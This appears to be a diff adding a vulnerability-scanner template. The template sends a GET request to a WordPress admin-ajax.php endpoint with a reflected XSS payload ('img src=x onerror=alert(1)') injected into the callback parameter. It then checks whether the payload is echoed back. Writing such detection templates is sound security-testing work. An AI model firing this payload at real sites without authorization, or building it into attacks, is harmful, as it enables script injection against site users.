@@ -1,0 +1,13 @@
+id: admin-ajax-xss
+info:
+  name: admin-ajax-php XSS (Found in DoD.)
+  author: SirBugs
+  severity: medium
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/wp-admin/admin-ajax.php?action=zip_search&nonce=5ccfc183d6a&zip=10001&callback=jQuery370034739925402950467_1693440634785"%3E%3Cimg src=x onerror=alert(1)>'
+    matchers:
+      - type: word
+        words:
+          - <img src=x onerror=alert(1)>
